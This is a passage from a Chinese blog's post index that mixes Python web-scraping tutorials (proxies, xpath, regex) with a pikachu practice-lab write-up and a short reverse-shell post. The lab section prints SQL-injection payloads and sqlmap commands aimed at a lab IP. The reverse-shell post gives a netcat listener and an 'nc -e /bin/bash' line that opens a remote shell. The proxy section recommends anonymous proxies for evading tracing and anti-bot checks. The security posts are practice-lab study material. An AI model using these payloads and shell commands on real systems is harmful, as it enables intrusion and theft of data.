小结在模拟登陆等场景，经常需要发送post请求，直接使用requests.post(url,data)即可 2、使用代理2.1 为什么要使用代理 让服务器以为不是同一个客户端在请求 防止我们的真实地址被泄露，防止被追究 2.2 理解使用代理的过程 2.3 理解正向代理和反向代理的区别（扩展） 通过上图可以看出： 正向代理：对于浏览器知道服务器的真实地址，例如VPN 反向代理：浏览器不知道服务器的真实地址，例如nginx 详细讲解： 正向代理是客户端与正向代理客户端在同一局域网，客户端发出请求，正向代理 替代客户端向服务器发出请求。服务器不知道谁是真正的客户端，正向代理隐藏了真实的请求客户端。反向代理：服务器与反向代理在同一个局域网，客服端发出请求，反向代理接收请求 ，反向代理服务器会把我们的请求分转发到真实提供服务的各台服务器Nginx就是性能非常好的反向代理服务器，用来做负载均衡 2.4 代理的使用 用法： 1requests.get(&quot;http://www.baidu.com&quot;, proxies = proxies) proxies的形式：字典 例如： 1234 proxies = &#123; &quot;http&quot;: &quot;http://12.34.56.79:9527&quot;, &quot;https&quot;: &quot;https://12.34.56.79:9527&quot;,&#125; 2.5 代理IP的分类根据代理ip的匿名程度，代理IP可以分为下面三类： 透明代理(Transparent Proxy)：透明代理的意思是客户端根本不需要知道有代理服务器的存在，但是它传送的仍然是真实的IP。使用透明代理时，对方服务器是可以知道你使用了代理的，并且他们也知道你的真实IP。你要想隐藏的话，不要用这个。透明代理为什么无法隐藏身份呢?因为他们将你的真实IP发送给了对方服务器，所以无法达到保护真实信息。 匿名代理(Anonymous Proxy)：匿名代理隐藏了您的真实IP，但是向访问对象可以检测是使用代理服务器访问他们的。会改变我们的请求信息，服务器端有可能会认为我们使用了代理。不过使用此种代理时，虽然被访问的网站不能知道你的ip地址，但仍然可以知道你在使用代理，当然某些能够侦测ip的网页也是可以查到你的ip。（https://wenku.baidu.com/view/9bf7b5bd3a3567ec102de2bd960590c69fc3d8cf.html） 高匿代理(Elite proxy或High Anonymity Proxy)：高匿名代理不改变客户机的请求，这样在服务器看来就像有个真正的客户浏览器在访问它，这时客户的真实IP是隐藏的，完全用代理服务器的信息替代了您的所有信息，就象您就是完全使用那台代理服务器直接访问对象，同时服务器端不会认为我们使用了代理。IPDIEA覆盖全球240＋国家地区ip高匿名代理不必担心被追踪。 在使用的使用，毫无疑问使用高匿代理效果最好 从请求使用的协议可以分为： http代理 https代理 socket代理等 不同分类的代理，在使用的时候需要根据抓取网站的协议来选择 2.6 代理IP使用的注意点 反反爬 使用代理ip是非常必要的一种反反爬的方式 但是即使使用了代理ip，对方服务器任然会有很多的方式来检测我们是否是一个爬虫，比如： 一段时间内，检测IP访问的频率，访问太多频繁会屏蔽 检查Cookie，User-Agent，Referer等header参数，若没有则屏蔽 服务方购买所有代理提供商，加入到反爬虫数据库里，若检测是代理则屏蔽 所以更好的方式在使用代理ip的时候使用随机的方式进行选择使用，不要每次都用一个代理ip 代理ip池的更新 购买的代理ip很多时候大部分(超过60%)可能都没办法使用，这个时候就需要通过程序去检测哪些可用，把不能用的删除掉。 代理服务器平台的使用： 当然还有很多免费的，但是大多都不可用需要自己尝试 http://www.66ip.cn https://ip.jiangxianli.com/?page=1 https://www.zdaye.com https://www.kuaidaili.com/free 3、配置 浏览器配置代理 右边三点=&#x3D;&gt; 设置=&#x3D;&gt; 高级=&#x3D;&gt; 代理=&#x3D;&gt; 局域网设置=&#x3D;&gt; 为LAN使用代理&#x3D;&#x3D;&gt; 输入ip和端口号即可 参考网址：https://jingyan.baidu.com/article/a681b0dece76407a1843468d.html 代码配置 urllib 123handler = urllib.request.ProxyHandler(&#123;&#x27;http&#x27;: &#x27;114.215.95.188:3128&#x27;&#125;)opener = urllib.request.build_opener(handler)# 后续都使用opener.open方法去发送请求即可 requests 12345678910111213141516171819202122232425# 用到的库import requests# 写入获取到的ip地址到proxy# 一个ip地址proxy = &#123; &#x27;http&#x27;:&#x27;http://221.178.232.130:8080&#x27;&#125;&quot;&quot;&quot;# 多个ip地址proxy = [ &#123;&#x27;http&#x27;:&#x27;http://221.178.232.130:8080&#x27;&#125;, &#123;&#x27;http&#x27;:&#x27;http://221.178.232.130:8080&#x27;&#125;]import randomproxy = random.choice(proxy)&quot;&quot;&quot;# 使用代理proxy = &#123; &#x27;http&#x27;: &#x27;http://58.20.184.187:9091&#x27;&#125;result = requests.get(&quot;http://httpbin.org/ip&quot;, proxies=proxy)print(result.text) 4、小结 requests发送post请求使用requests.post方法，带上请求体，其中请求体需要时字典的形式，传递给data参数接收 在requests中使用代理，需要准备字典形式的代理，传递给proxies参数接收 不同协议的url地址，需要使用不同的代理去请求","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"爬虫","slug":"开发/python/爬虫","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"urllib与requests3","slug":"urllib与requests3","date":"2023-12-28T05:03:13.790Z","updated":"2023-12-28T06:29:02.159Z","comments":true,"path":"2023/12/28/urllib与requests3/","permalink":"http://example.com/2023/12/28/urllib%E4%B8%8Erequests3/","excerpt":"","text":"前情摘要一、web请求全过程剖析我们浏览器在输入完网址到我们看到网页的整体内容, 这个过程中究竟发生了些什么? 我们看一下一个浏览器请求的全过程 接下来就是一个比较重要的事情了. 所有的数据都在页面源代码里么? 非也~ 这里要介绍一个新的概念 那就是页面渲染数据的过程, 我们常见的页面渲染过程有两种, 服务器渲染, 你需要的数据直接在页面源代码里能搜到 这个最容易理解, 也是最简单的. 含义呢就是我们在请求到服务器的时候, 服务器直接把数据全部写入到html中, 我们浏览器就能直接拿到带有数据的html内容. 比如, 由于数据是直接写在html中的, 所以我们能看到的数据都在页面源代码中能找的到的. 这种网页一般都相对比较容易就能抓取到页面内容. 前端JS渲染, 你需要的数据在页面源代码里搜不到 这种就稍显麻烦了. 这种机制一般是第一次请求服务器返回一堆HTML框架结构. 然后再次请求到真正保存数据的服务器, 由这个服务器返回数据, 最后在浏览器上对数据进行加载. 就像这样: js渲染代码（示例） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;案例：动态渲染页面&lt;/title&gt; &lt;style&gt; table&#123; width: 300px; text-align: center; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;table border=&quot;1&quot; cellspacing=&quot;0&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;ID&lt;/th&gt; &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;年龄&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;!-- js渲染--&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;script&gt; //提前准备好的数据 var users = [ &#123;id: 1, name: &#x27;张三&#x27;, age: 18&#125;, &#123;id: 2, name: &#x27;李四&#x27;, age: 28&#125;, &#123;id: 3, name: &#x27;王麻子&#x27;, age: 38&#125; ] //获取tbody标签 var tbody = document.querySelector(&#x27;tbody&#x27;) //1.循环遍历users数据 users.forEach(function (item) &#123; //这里的item 就是数组中的每一个对象 console.log(item) //2. 每一个对象生成一个tr标签 var tr = document.createElement(&#x27;tr&#x27;) //循环遍历item for(var key in item)&#123; //生成td标签 var td = document.createElement(&#x27;td&#x27;) td.innerHTML = item[key] //5.把td 插入到tr内部 tr.appendChild(td) &#125; //把本次的tr插入到tbody的内部 tbody.appendChild(tr) &#125;) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这样做的好处是服务器那边能缓解压力. 而且分工明确. 比较容易维护. 典型的有这么一个网页 那数据是何时加载进来的呢? 其实就是在我们进行页面向下滚动的时候, jd就在偷偷的加载数据了, 此时想要看到这个页面的加载全过程, 我们就需要借助浏览器的调试工具了(F12) 看到了吧, 页面上看到的内容其实是后加载进来的. OK, 在这里我不是要跟各位讲jd有多牛B, 也不是说这两种方式有什么不同, 只是想告诉各位, 有些时候, 我们的数据不一定都是直接来自于页面源代码. 如果你在页面源代码中找不到你要的数据时, 那很可能数据是存放在另一个请求里. 121.你要的东西在页面源代码. 直接拿`源代码`提取数据即可2.你要的东西，不在页面源代码, 需要想办法找到真正的加载数据的那个请求. 然后提取数据 二、浏览器工具的使用Chrome是一款非常优秀的浏览器. 不仅仅体现在用户使用上. 对于我们开发人员而言也是非常非常好用的. 对于一名爬虫工程师而言. 浏览器是最能直观的看到网页情况以及网页加载内容的地方. 我们可以按下F12来查看一些普通用户很少能使用到的工具. 其中, 最重要的Elements, Console, Sources, Network. Elements是我们实时的网页内容情况, 注意, 很多兄弟尤其到了后期. 非常容易混淆Elements以及页面源代码之间的关系. 注意, 页面源代码是执行js脚本以及用户操作之前的服务器返回给我们最原始的内容 Elements中看到的内容是js脚本以及用户操作之后的当时的页面显示效果. 你可以理解为, 一个是老师批改之前的卷子, 一个是老师批改之后的卷子. 虽然都是卷子. 但是内容是不一样的. 而我们目前能够拿到的都是页面源代码. 也就是老师批改之前的样子. 这一点要格外注意. 在Elements中我们可以使用左上角的小箭头.可以直观的看到浏览器中每一块位置对应的当前html状况. 还是很贴心的. 第二个窗口, Console是用来查看程序员留下的一些打印内容, 以及日志内容的. 我们可以在这里输入一些js代码自动执行. 等咱们后面讲解js逆向的时候会用到这里. 第三个窗口, Source, 这里能看到该网页打开时加载的所有内容. 包括页面源代码. 脚本. 样式, 图片等等全部内容. 第四个窗口, Network, 我们一般习惯称呼它为抓包工具. 在这里, 我们能看到当前网页加载的所有网路网络请求, 以及请求的详细内容. 这一点对我们爬虫来说至关重要. 其他更加具体的内容. 随着咱们学习的展开. 会逐一进行讲解. 三、反爬虫的一般手段爬虫项目最复杂的不是页面信息的提取，反而是爬虫与反爬虫、反反爬虫的博弈过程 User-Agent 浏览器的标志信息，会通过请求头传递给服务器，用以说明访问数据的浏览器信息 反爬虫：先检查是否有UA，或者UA是否合法 代理IP 验证码访问 动态加载网页 数据加密 … 四、常见HTTP状态码 200：这个是最常见的http状态码，表示服务器已经成功接受请求，并将返回客户端所请 100-199 用于指定客户端应相应的某些动作。 200-299 用于表示请求成功。 300-399 用于已经移动的文件并且常被包含在定位头信息中指定新的地址信息。 400-499 用于指出客户端的错误。 404：请求失败，客户端请求的资源没有找到或者是不存在 500-599 服务器遇到未知的错误，导致无法完成客户端当前的请求。","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"爬虫","slug":"开发/python/爬虫","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"xpath","slug":"xpath","date":"2023-12-28T04:53:07.411Z","updated":"2023-12-28T04:54:28.925Z","comments":true,"path":"2023/12/28/xpath/","permalink":"http://example.com/2023/12/28/xpath/","excerpt":"","text":"xpath1、xpath安装与使用安装 安装lxml库 pip install lxml -i pip源 2、解析流程与使用解析流程 实例化一个etree的对象，把即将被解析的页面源码加载到该对象 调用该对象的xpath方法结合着不同形式的xpath表达进行标签定位和数据提取 使用 导入lxml.etree from lxml import etree etree.parse() 解析本地html文件 html_tree &#x3D; etree.parse(‘XX.html’) etree.HTML()(建议) 解析网络的html字符串 html_tree &#x3D; etree.HTML(html字符串) html_tree.xpath() 使用xpath路径查询信息，返回一个列表 注意：如果lxml解析本地HTML文件报错可以安装如下添加参数 123parser = etree.HTMLParser(encoding=&quot;utf-8&quot;)selector = etree.parse(&#x27;./lol_1.html&#x27;,parser=parser)result=etree.tostring(selector) 3、xpath语法XPath 是一门在 XML 文档中查找信息的语言。XPath 用于在 XML 文档中通过元素和属性进行导航。 路径表达式 表达式 描述 &#x2F; 从根节点选取。 &#x2F;&#x2F; 从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。 .&#x2F; 当前节点再次进行xpath @ 选取属性。 实例 在下面的表格中，我们已列出了一些路径表达式以及表达式的结果： 路径表达式 结果 &#x2F;html 选取根元素。注释：假如路径起始于正斜杠( &#x2F; )，则此路径始终代表到某元素的绝对路径！ &#x2F;&#x2F;li 选取所有li 子元素，而不管它们在文档中的位置。 &#x2F;&#x2F;ul&#x2F;&#x2F;li 选择属于 ul元素的后代的所有 li元素，而不管它们位于 ul之下的什么位置。 节点对象.xpath(‘.&#x2F;div’) 选择当前节点对象里面的第一个div节点 &#x2F;&#x2F;@href 选取名为 href 的所有属性。 谓语（Predicates） 谓语用来查找某个特定的节点或者包含某个指定的值的节点。 谓语被嵌在方括号中。 实例 在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果： 路径表达式 结果 &#x2F;ul&#x2F;li[1] 选取属于 ul子元素的第一个 li元素。 &#x2F;ul&#x2F;li[last()] 选取属于 ul子元素的最后一个 li元素。 &#x2F;ul&#x2F;li[last()-1] 选取属于 ul子元素的倒数第二个 li元素。 &#x2F;&#x2F;ul&#x2F;li[position()&lt;3] 选取最前面的两个属于 ul元素的子元素的 li元素。 &#x2F;&#x2F;a[@title] 选取所有拥有名为 title的属性的 a元素。 &#x2F;&#x2F;a[@title&#x3D;’xx’] 选取所有 a元素，且这些元素拥有值为 xx的 title属性。 &#x2F;&#x2F;a[@title&gt;10] &gt; &lt; &gt;= &lt;= != 选取 a元素的所有 title元素，且其中的 title元素的值须大于 10。 &#x2F;bookstore&#x2F;book[price&gt;35.00]&#x2F;title 选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。 选取未知节点 XPath 通配符可用来选取未知的 XML 元素。 通配符 描述 * 匹配任何元素节点。 一般用于浏览器copy xpath会出现 @* 匹配任何属性节点。 node() 匹配任何类型的节点。 实例 在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果： 路径表达式 结果 &#x2F;ul&#x2F;* 选取 ul元素的所有子元素。 &#x2F;&#x2F;* 选取文档中的所有元素。 &#x2F;&#x2F;title[@*] 选取所有带有属性的 title 元素。 &#x2F;&#x2F;node() 获取所有节点 选取若干路径 通过在路径表达式中使用“|”运算符，您可以选取若干个路径。 实例 在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果： 路径表达式 结果 &#x2F;&#x2F;book&#x2F;title | &#x2F;&#x2F;book&#x2F;price 选取 book 元素的所有 title 和 price 元素。 &#x2F;&#x2F;title | &#x2F;&#x2F;price 选取文档中的所有 title 和 price 元素。 &#x2F;bookstore&#x2F;book&#x2F;title | &#x2F;&#x2F;price 选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素。 逻辑运算 查找所有id属性等于head并且class属性等于s_down的div标签 1//div[@id=&quot;head&quot; and @class=&quot;s_down&quot;] 选取文档中的所有 title 和 price 元素。 1//title | //price 注意: “|”两边必须是完整的xpath路径 属性查询 查找所有包含id属性的div节点 1//div[@id] 查找所有id属性等于maincontent的div标签 1//div[@id=&quot;maincontent&quot;] 查找所有的class属性 1//@class &#x2F;&#x2F;@attrName 1//li[@name=&quot;xx&quot;]//text() # 获取li标签name为xx的里面的文本内容 获取第几个标签 索引从1开始 123tree.xpath(&#x27;//li[1]/a/text()&#x27;) # 获取第一个tree.xpath(&#x27;//li[last()]/a/text()&#x27;) # 获取最后一个tree.xpath(&#x27;//li[last()-1]/a/text()&#x27;) # 获取倒数第二个 模糊查询 查询所有id属性中包含he的div标签 1//div[contains(@id, &quot;he&quot;)] 查询所有id属性中包以he开头的div标签 1//div[starts-with(@id, &quot;he&quot;)] 内容查询 查找所有div标签下的直接子节点h1的内容 1//div/h1/text() 属性值获取 1//div/a/@href 获取a里面的href属性值 获取所有 12//* #获取所有//*[@class=&quot;xx&quot;] #获取所有class为xx的标签 获取节点内容转换成字符串 123c = tree.xpath(&#x27;//li/a&#x27;)[0]result=etree.tostring(c, encoding=&#x27;utf-8&#x27;)print(result.decode(&#x27;UTF-8&#x27;))","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"爬虫","slug":"开发/python/爬虫","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"pikachu靶场","slug":"pikachu靶场","date":"2023-12-27T13:19:27.780Z","updated":"2023-12-27T13:45:01.891Z","comments":true,"path":"2023/12/27/pikachu靶场/","permalink":"http://example.com/2023/12/27/pikachu%E9%9D%B6%E5%9C%BA/","excerpt":"","text":"暴力破解原理：暴力破解（是一种计算机安全攻击方法，其原理是通过尝试所有可能的密码组合，直到找到正确的密码为止。 1.基于表单的暴力破解 看到这个，再看到题目名字，直接使用burp中的爆破功能，我们抓取他登陆的包 然后导入我们的字典，开始爆破，成功得出账号密码分别是admin和123456 2.验证码绕过(on server)1.保持bp的抓包状态，随便输入账号和密码，先不输入验证码。 2.打开bp，右击选择send to repeater，把请求发送到 repeater 3.打开Repeater，点击GO,观察状态。 4.这时，右侧会显示验证码不能为空，因为此前没有输入验证码 5.如果随便输入一个验证码，此时显示验证码错误！ 6.然后把pikachu平台中的正确的验证码输入进去，则显示账号或密码错误！说明了后台会把提交的验证码进行验证，看是否正确，接下来进行暴力破解！ 7.然后把pikachu平台中的正确的验证码输入进去，则显示账号或密码错误！说明了后台会把提交的验证码进行验证，看是否正确，接下来进行暴力破解！步骤和基于表单的暴力破解是一样。将Proxy中抓到的，右击发送到Intruder，然后添加账户和密码变量，放入字典。 （第一题知道了他账号密码，所以就直接不上字典了） 3.验证码绕过(on click)验证码输入正确、为空、输入错误分别提示login success，请输入验证码，验证码输入错误。 什么都不输入或只输入用户名和密码点击登录，页面弹出“请输入验证码！”的提示框，而不是用户名和密码不存在 我们查看源码，输入的验证码在本地验证，我们可以在burp suite不输入验证码或者输入错的验证码完成爆破 burp suite抓包，删除验证码，发送到intruder模块 4.token防爆破？这一关增加的Token值，用来防止爆破，不过在多次抓包在之后，发现每次返回的数据中含有下一次的Token值 满足以上条件我们就可以使用burp的音叉攻击进行爆破，线程必须为1，参数为password和token password载荷设置： 上图中，第五步复制的value值放入下图中： 开始攻击 SQL-Inject1. 数字型注入提示提交方式为post，使用手注 使用bp抓包并发送到Repeater 判断列数为2 查库 查表 查列 查数据 可知密码通过md5加密，使用账号&#x2F;密码为admin&#x2F;123456 2.字符型注入提示为字符型，且提交方式为get，使用sqlmap 查询数据库 1sqlmap -u &#x27;http://47.97.37.19:8000/vul/sqli/sqli_str.php?name=valen&amp;submit=%E6%9F%A5%E8%AF%A2&#x27; --dbs 查询数据表 1sqlmap -u &#x27;http://47.97.37.19:8000/vul/sqli/sqli_str.php?name=valen&amp;submit=%E6%9F%A5%E8%AF%A2&#x27; -D pikachu --tables 查询数据表中的数据 1sqlmap -u &#x27;http://47.97.37.19:8000/vul/sqli/sqli_str.php?name=valen&amp;submit=%E6%9F%A5%E8%AF%A2&#x27; -D pikachu -T users --dump 3.搜索型注入123456//手注Payload:&#x27; order by 3 # //爆回显位&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() # //爆数据表名&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=users # //爆字段名&#x27; union select 1,username,password from users # //爆字段值 4.insert&#x2F;update注入1234//sqlmapPayload:sqlmap -u &quot;http://47.97.37.19:8000/vul/sqli/sqli_iu/sqli_reg.php&quot; --data=&quot;username=1111&amp;password=1&amp;sex=1&amp;phonenum=1&amp;email=1&amp;add=1&amp;submit=submit&quot; --dbs余下步骤与第二题一样 5.delete注入12345//在bp中手注（报错注入）//手注Payload:and updatexml(1,concat(0x7e,(select database()),0x7e),1) //查询库//余下步骤与第七题一样 7.http头注入12345678//在bp中手注（报错注入）//手注Payload:1&#x27; update(0,concat(0x7b,database()),1) or &#x27; //查库&#x27; or updatexml(0,concat(0x7b,substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;),1,31)),1) or &#x27; //查表&#x27; or updatexml(0,concat(0x7b,substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,31)),1) or &#x27; //查字段名&#x27; or updatexml(0,concat(0x7b,substr((select group_concat(username,&#x27;:&#x27;,password) from users),1,31)),1) or &#x27; //查字段值//报错误注入会限制整数，可修改查询语句来查询未查询信息 8.基于boolian的盲注12345//（布尔盲注通过页面返回的True或False来判断）//sqlmapPayload:sqlmap -u &quot;http://47.97.37.19:8000/vul/sqli/sqli_blind_b.php?name=ad&amp;submit=%E6%9F%A5%E8%AF%A2&quot; –dbs//余下步骤与第二题一样 9.基于时间的盲注12345//(时间盲注通过页面回应时间来判断)//sqlmapPayload:sqlmap -u &quot;http://47.97.37.19:8000/vul/sqli/sqli_blind_t.php?name=ad&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --dbs //余下步骤与第二题一样 10.wide byte注入1234567//在bp中手注///Payload: name=kobe%df’ union select 1,database() # //查库name=1%df’ union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2# //查表name=1%df’ union select (select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 3,1)),2# //查字段名name=1%df’ union select (select group_concat(username,0x3b,password) from test.users),2#//查字段内容 RCE1. exec “ping”输入框相当与linux终端 可以利用反shell控制（需要内网穿透）、上传木马 2.exec “eval”输入框将用户输入的字符串当做php脚本了解析执行 可以利用system()函数反shell连接（需要内网穿透）或者上传木马通过中国蚁剑连接","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"靶场","slug":"安全/网络渗透测试/靶场","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"反弹shell","slug":"反弹shell","date":"2023-12-27T12:44:27.860Z","updated":"2023-12-28T12:47:49.601Z","comments":true,"path":"2023/12/27/反弹shell/","permalink":"http://example.com/2023/12/27/%E5%8F%8D%E5%BC%B9shell/","excerpt":"","text":"nc连接攻击机 1nc -lvp [端口] 靶机 12nc -e /bin/bash 192.168.1.105 19111// 攻击机ip 端口","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"web安全","slug":"安全/web安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://example.com/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"正则","slug":"正则","date":"2023-12-26T04:51:20.920Z","updated":"2023-12-26T04:53:26.023Z","comments":true,"path":"2023/12/26/正则/","permalink":"http://example.com/2023/12/26/%E6%AD%A3%E5%88%99/","excerpt":"","text":"一、正则基础1、为什么使用正则 需求 判断一个字符串是否是手机号 解决 编写一个函数，给函数一个字符串，如果是手机号则返回True，否则返回False 代码 12345678910def isPhone(phone): # 长度为11 # 全部都是数字字符 # 以1开头 passif isPhone(&quot;13812345678&quot;): print(&quot;是手机号&quot;)else: print(&quot;不是手机号&quot;) 注意 如果使用正则会让这个问题变得简单 2、正则与re模块简介概述： 正则表达式，又称规则表达式 正则表达式(regular expression)描述了一种字符串匹配的模式（pattern） 正则匹配是一个 模糊的匹配(不是精确匹配) re：python自1.5版本开始增加了re模块，该模块提供了perl风格的正则表达式模式，re模块是python语言拥有了所有正则表达式的功能 如下四个方法经常使用 match() search() findall() finditer() 二、正则表达式1、匹配单个字符与数字 匹配 说明 . 匹配除换行符以外的任意字符，当flags被设置为re.S时，可以匹配包含换行符以内的所有字符 [] 里面是字符集合，匹配[]里任意一个字符 [0123456789] 匹配任意一个数字字符 [0-9] 匹配任意一个数字字符 [a-z] 匹配任意一个小写英文字母字符 [A-Z] 匹配任意一个大写英文字母字符 [A-Za-z] 匹配任意一个英文字母字符 [A-Za-z0-9] 匹配任意一个数字或英文字母字符 [^lucky] []里的^称为脱字符，表示非，匹配不在[]内的任意一个字符 ^[lucky] 以[]中内的某一个字符作为开头 \\d 匹配任意一个数字字符，相当于[0-9] \\D 匹配任意一个非数字字符，相当于[^0-9] \\w 匹配字母、下划线、数字中的任意一个字符，相当于[0-9A-Za-z_] \\W 匹配非字母、下划线、数字中的任意一个字符，相当于[^0-9A-Za-z_] \\s 匹配空白符(空格、换页、换行、回车、制表)，相当于[ \\f\\n\\r\\t] \\S 匹配非空白符(空格、换页、换行、回车、制表)，相当于[^ \\f\\n\\r\\t] 2、匹配锚字符锚字符:用来判定是否按照规定开始或者结尾 匹配 说明 ^ 行首匹配，和[]里的^不是一个意思 $ 行尾匹配 3、限定符限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。 匹配 说明 (xyz) 匹配括号内的xyz，作为一个整体去匹配 一个单元 子存储 x? 匹配0个或者1个x，非贪婪匹配 x* 匹配0个或任意多个x x+ 匹配至少一个x x{n} 确定匹配n个x，n是非负数 x{n,} 至少匹配n个x x{n,m} 匹配至少n个最多m个x x|y |表示或的意思，匹配x或y 三、re模块中常用函数通用flags（修正符） 值 说明 re.I 是匹配对大小写不敏感 re.S 使.匹配包括换行符在内的所有字符 通用函数 获取匹配结果 使用group()方法 获取到匹配的值 groups() 返回一个包含所有小组字符串的元组(也就是自存储的值)，从 1 到 所含的小组号。 1、match()函数 原型 1def match(pattern, string, flags=0) 功能 匹配成功返回 匹配的对象 匹配失败 返回 None 获取匹配结果 使用group()方法 获取到匹配的值 groups() 返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。 注意：从第一位开始匹配 只匹配一次 参数 参数 说明 pattern 匹配的正则表达式(一种字符串的模式) string 要匹配的字符串 flags 标识位，用于控制正则表达式的匹配方式 代码 12345678910import reres = re.match(&#x27;\\d&#123;2&#125;&#x27;,&#x27;123&#x27;)print(res.group())#给当前匹配到的结果起别名s = &#x27;3G4HFD567&#x27;re.match(&quot;(?P&lt;value&gt;\\d+)&quot;,s)print(x.group(0))print(x.group(&#x27;value&#x27;)) 2、searce()函数 原型 1def search(pattern, string, flags=0) 功能 扫描整个字符串string，并返回第一个pattern模式成功的匹配 匹配失败 返回 None 参数 参数 说明 pattern 匹配的正则表达式(一种字符串的模式) string 要匹配的字符串 flags 标识位，用于控制正则表达式的匹配方式 注意： 只要字符串包含就可以 只匹配一次 示例 12345import reres = re.search(&#x27;[a-z]&#x27;, &#x27;131A3ab889s&#x27;)print(res)print(res.group() 注意 与search的区别 相同点： 都只匹配一次 不同点： search是在要匹配的字符串中 包含正则表达式的内容就可以 match 必须第一位就开始匹配 否则匹配失败 3、findall()函数（返回列表） 原型 1def findall(pattern, string, flags=0) 功能 扫描整个字符串string，并返回所有匹配的pattern模式结果的字符串列表 参数 参数 说明 pattern 匹配的正则表达式(一种字符串的模式) string 要匹配的字符串 flags 标识位，用于控制正则表达式的匹配方式 示例 12345678910111213141516171819202122232425myStr = &quot;&quot;&quot;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&lt;A href=&quot;http://www.taobao.com&quot;&gt;淘宝&lt;/A&gt;&lt;a href=&quot;http://www.id97.com&quot;&gt;电影网站&lt;/a&gt;&lt;i&gt;我是倾斜1&lt;/i&gt;&lt;i&gt;我是倾斜2&lt;/i&gt;&lt;em&gt;我是倾斜2&lt;/em&gt;&quot;&quot;&quot;# html里是不区分大小写# （1）给正则里面匹配的 加上圆括号 会将括号里面的内容进行 单独的返回res = re.findall(&quot;(&lt;a href=\\&quot;http://www\\.(.*?)\\.com\\&quot;&gt;(.*?)&lt;/a&gt;)&quot;,myStr) #[(&#x27;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&#x27;, &#x27;baidu&#x27;, &#x27;百度&#x27;)]# 括号的区别res = re.findall(&quot;&lt;a href=\\&quot;http://www\\..*?\\.com\\&quot;&gt;.*?&lt;/a&gt;&quot;,myStr) #[&#x27;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&#x27;]#(2) 不区分大小写的匹配res = re.findall(&quot;&lt;a href=\\&quot;http://www\\..*?\\.com\\&quot;&gt;.*?&lt;/a&gt;&quot;,myStr,re.I) #[&#x27;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&#x27;, &#x27;&lt;A href=&quot;http://www.taobao.com&quot;&gt;淘宝&lt;/A&gt;&#x27;]res = re.findall(&quot;&lt;[aA] href=\\&quot;http://www\\..*?\\.com\\&quot;&gt;.*?&lt;/[aA]&gt;&quot;,myStr) #[&#x27;&lt;a href=&quot;http://www.baidu.com&quot;&gt;百度&lt;/a&gt;&#x27;]# (3) 使.支持换行匹配res = re.findall(&quot;&lt;a 